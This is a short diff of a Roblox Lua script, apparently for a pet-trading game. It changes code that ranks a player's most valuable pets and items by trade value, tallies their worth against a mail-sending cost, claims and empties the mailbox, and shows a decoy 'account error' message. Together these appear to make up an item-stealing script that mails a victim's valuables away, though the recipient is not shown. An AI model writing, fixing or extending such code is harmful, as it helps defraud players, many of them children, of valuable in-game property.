@@ -296,7 +296,6 @@ for i, v in pairs(categoryList) do
 	if save[v] ~= nil then
 		for uid, item in pairs(save[v]) do
 			if v == "Pet" then
-                -- START UPDATED LINES
                 local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
                 if dir.gargantuan or dir.titanic or dir.huge or dir.exclusiveLevel then
                     local rapValue = getRAP(v, item)
@@ -311,11 +310,10 @@ for i, v in pairs(categoryList) do
                             prefix = "Shiny " .. prefix
                         end
                         local id = prefix .. item.id
-                        table.insert(sortedItems, {category = v, uid = uid, amount = 1, rap = rapValue, name = id}) -- pets always 1 per mail
-                        totalRAP = totalRAP + rapValue -- amount=1
+                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
+                        totalRAP = totalRAP + (rapValue * (item._am or 1))
                     end
                 end
-                -- END UPDATED LINES
             else
                 local rapValue = getRAP(v, item)
                 if rapValue >= min_rap then
@@ -335,8 +333,8 @@ for i, v in pairs(categoryList) do
 end
 
 if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
-    ClaimMail
-    EmptyBoxes()
+    ClaimMail()
+	EmptyBoxes()
     if not canSendMail() then
         message.Error("Account error. Please rejoin and try again or use a different account")
         return
